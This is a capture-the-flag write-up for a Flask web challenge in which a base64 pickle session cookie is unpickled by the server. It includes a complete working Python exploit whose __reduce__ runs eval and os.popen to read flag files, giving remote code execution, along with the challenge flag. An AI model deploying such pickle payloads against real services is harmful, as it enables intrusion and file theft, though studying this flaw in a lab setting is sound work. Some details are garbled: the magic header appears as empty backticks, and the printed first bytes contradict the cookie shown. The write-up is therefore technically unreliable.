# GadgetChain_MU (Security Impossible CTF 2026 - Monash University, web)

GadgetChain presents a Python Flask web application featuring user registration, login, and an account management profile page at `/profile`. Authenticated sessions are tracked using a base64-encoded cookie named `session`. Our goal is to achieve remote code execution and extract the flag from the server filesystem.

## Inspecting the Session Cookie

Upon logging in as a standard guest user, the application sets a `session` cookie:

```text
session=gASVNQAAAAAAAAB9cQAoWAQAAAB1c2VycQFYBQAAAGd1ZXN0cQJYBAAAAHJvbGVxBFgEAAAAdXNlcnEFdS4=
```

Base64-decoding the cookie reveals binary data beginning with ``:

```python
import base64
raw = base64.b64decode("gASVNQAAAAAAAAB9cQAoWAQAAAB1c2VycQFYBQAAAGd1ZXN0cQJYBAAAAHJvbGVxBFgEAAAAdXNlcnEFdS4=")
print(raw[:4])  # b'}q'
```

In Python, `` is the magic header identifying **Python Pickle Protocol 4**.

De-pickling the cookie in Python returns a dictionary:
`{'user': 'guest', 'role': 'user'}`

Inspecting the application handler for `/profile`:
1. The server reads `request.cookies.get('session')`.
2. It base64-decodes the string and immediately invokes `pickle.loads(raw_data)`.
3. It renders `session_data.get('user')` into the HTML template: `Welcome back, {{ user }}!`.

## The Python Pickle Deserialization Vulnerability

Python's `pickle` module is an object serialization library, not a secure data interchange format. When `pickle.loads()` reconstructs an object, it evaluates pickle bytecode instructions.

If an object defines the `__reduce__()` magic method, the pickle engine invokes it during serialization. `__reduce__()` must return either a string or a tuple:
`(callable, (arg1, arg2, ...))`

When the pickled byte stream is deserialized on the server, the unpickler automatically executes:
`callable(arg1, arg2, ...)`

This allows an attacker to invoke arbitrary functions, such as `os.system`, `subprocess.Popen`, or `eval`, leading directly to Remote Code Execution (RCE).

## Crafting the In-Band Exfiltration Payload

Because the application renders `session_data['user']` on the web page, we can exfiltrate command output in-band through the HTTP response rather than relying on blind out-of-band reverse shells.

We construct an exploit class where `__reduce__` returns `eval` evaluated against a Python expression. The expression executes `os.popen()` to read `/flag*` and formats the result as a valid dictionary with `'user'` containing the command output and `'role'` set to `'admin'`:

```python
import base64
import pickle
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "target-web-45-gadgetchain"
PORT = 5117

class Exploit:
    def __reduce__(self):
        cmd = "__import__('os').popen('cat /flag.txt /flag /app/flag* 2>/dev/null').read()"
        payload = '{"user": ' + cmd + ', "role": "admin"}'
        return (eval, (payload,))

payload_cookie = base64.b64encode(pickle.dumps(Exploit())).decode()

url = f"http://{TARGET}:{PORT}/profile"
cookies = {"session": payload_cookie}
resp = requests.get(url, cookies=cookies)

print("Response:")
for line in resp.text.splitlines():
    if "sictf{" in line:
        print(line.strip())
```

Sending the forged cookie executes the shell command on deserialization. The flag appears directly inside the rendered HTML welcome banner.

Solve: `solve/solve.py`

Flag: `sictf{b17d5db0153f59a089dde834e7d85476}`
